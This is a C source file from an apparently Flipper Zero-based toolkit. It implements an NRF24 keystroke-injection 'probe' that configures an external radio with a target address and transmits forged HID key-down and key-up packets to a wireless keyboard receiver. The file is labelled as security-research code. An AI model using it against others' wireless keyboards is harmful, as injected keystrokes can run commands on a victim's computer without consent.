/**
 * NRF24 Inject Probe
 *
 * NRF24 keystroke injection for wireless keyboard/mouse security research.
 * Requires external NRF24 module connected to Flipper.
 */

#include "../probes.h"
#include "../../../helpers/external_radio.h"
#include <furi.h>
#include <string.h>

#define TAG "ProbeNRF24"

void handle_nrf24_inject_tx(FlockBridgeApp* app, const uint8_t* buffer, size_t length) {
    notification_message(app->notifications, &sequence_blink_magenta_10);
    notification_message(app->notifications, &sequence_blink_magenta_10);

    FlockNrf24InjectPayload nrf_payload;
    if (!flock_protocol_parse_nrf24_inject(buffer, length, &nrf_payload)) {
        size_t len = flock_protocol_create_error(
            FLOCK_ERR_INVALID_PARAM, "Invalid NRF24 inject parameters",
            app->tx_buffer, sizeof(app->tx_buffer));
        if (len > 0) {
            flock_bridge_send_data(app, app->tx_buffer, len);
        }
        return;
    }

    FURI_LOG_I(TAG, "NRF24 Inject TX: addr=%02X:%02X:%02X:%02X:%02X, %u keystrokes",
        nrf_payload.address[0], nrf_payload.address[1], nrf_payload.address[2],
        nrf_payload.address[3], nrf_payload.address[4], nrf_payload.keystroke_len);

    // Validate parameters
    if (nrf_payload.keystroke_len == 0 || nrf_payload.keystroke_len > 64) {
        size_t len = flock_protocol_create_error(
            FLOCK_ERR_INVALID_PARAM, "NRF24 keystroke count invalid",
            app->tx_buffer, sizeof(app->tx_buffer));
        if (len > 0) {
            flock_bridge_send_data(app, app->tx_buffer, len);
        }
        return;
    }

    // Check if external radio module is available
    if (!app->external_radio || !external_radio_is_connected(app->external_radio)) {
        size_t len = flock_protocol_create_error(
            FLOCK_ERR_HARDWARE_FAIL, "NRF24 module not connected",
            app->tx_buffer, sizeof(app->tx_buffer));
        if (len > 0) {
            flock_bridge_send_data(app, app->tx_buffer, len);
        }
        return;
    }

    // Check for NRF24 inject capability
    uint32_t caps = external_radio_get_capabilities(app->external_radio);
    if (!(caps & EXT_RADIO_CAP_NRF24_INJECT)) {
        size_t len = flock_protocol_create_error(
            FLOCK_ERR_HARDWARE_FAIL, "NRF24 not supported by radio",
            app->tx_buffer, sizeof(app->tx_buffer));
        if (len > 0) {
            flock_bridge_send_data(app, app->tx_buffer, len);
        }
        return;
    }

    const uint8_t NRF24_CHANNEL = 5;
    const uint8_t NRF24_PAYLOAD_SIZE = 22;
    const uint32_t KEYSTROKE_DELAY_MS = 50;

    FURI_LOG_I(TAG, "NRF24: configuring for channel %u", NRF24_CHANNEL);

    // Build configuration command: [channel][address 5 bytes]
    uint8_t config_cmd[6];
    config_cmd[0] = NRF24_CHANNEL;
    memcpy(&config_cmd[1], nrf_payload.address, 5);

    if (!external_radio_send_command(app->external_radio, ExtRadioCmdNrf24Config, config_cmd, 6)) {
        FURI_LOG_E(TAG, "NRF24: failed to configure");
        size_t len = flock_protocol_create_error(
            FLOCK_ERR_HARDWARE_FAIL, "Failed to configure NRF24",
            app->tx_buffer, sizeof(app->tx_buffer));
        if (len > 0) {
            flock_bridge_send_data(app, app->tx_buffer, len);
        }
        return;
    }

    // Send each keystroke
    for (uint8_t i = 0; i < nrf_payload.keystroke_len; i++) {
        uint8_t keystroke = nrf_payload.keystrokes[i];

        // Build HID payload
        uint8_t payload[NRF24_PAYLOAD_SIZE];
        memset(payload, 0, sizeof(payload));

        payload[0] = 0x00;  // Device type (keyboard)
        payload[1] = 0xC1;  // Packet type
        payload[2] = 0x00;  // Modifiers
        payload[3] = 0x00;  // Reserved
        payload[4] = 0x00;  // Reserved
        payload[5] = 0x00;  // Reserved
        payload[6] = keystroke;  // HID keycode
        payload[7] = 0x00;  // Additional keys

        // Calculate checksum
        uint8_t checksum = 0;
        for (int j = 0; j < NRF24_PAYLOAD_SIZE - 1; j++) {
            checksum ^= payload[j];
        }
        payload[NRF24_PAYLOAD_SIZE - 1] = checksum;

        // Send key down
        if (!external_radio_send_command(app->external_radio, ExtRadioCmdNrf24Tx, payload, NRF24_PAYLOAD_SIZE)) {
            FURI_LOG_W(TAG, "NRF24: failed to send key 0x%02X", keystroke);
        }

        FURI_LOG_D(TAG, "NRF24: sent key 0x%02X", keystroke);
        furi_delay_ms(10);

        // Send key up
        payload[6] = 0x00;
        checksum = 0;
        for (int j = 0; j < NRF24_PAYLOAD_SIZE - 1; j++) {
            checksum ^= payload[j];
        }
        payload[NRF24_PAYLOAD_SIZE - 1] = checksum;

        external_radio_send_command(app->external_radio, ExtRadioCmdNrf24Tx, payload, NRF24_PAYLOAD_SIZE);
        furi_delay_ms(KEYSTROKE_DELAY_MS);
    }

    FURI_LOG_I(TAG, "NRF24 Inject TX complete: %u keystrokes sent", nrf_payload.keystroke_len);

    size_t len = flock_protocol_create_heartbeat(app->tx_buffer, sizeof(app->tx_buffer));
    if (len > 0) {
        flock_bridge_send_data(app, app->tx_buffer, len);
    }
}
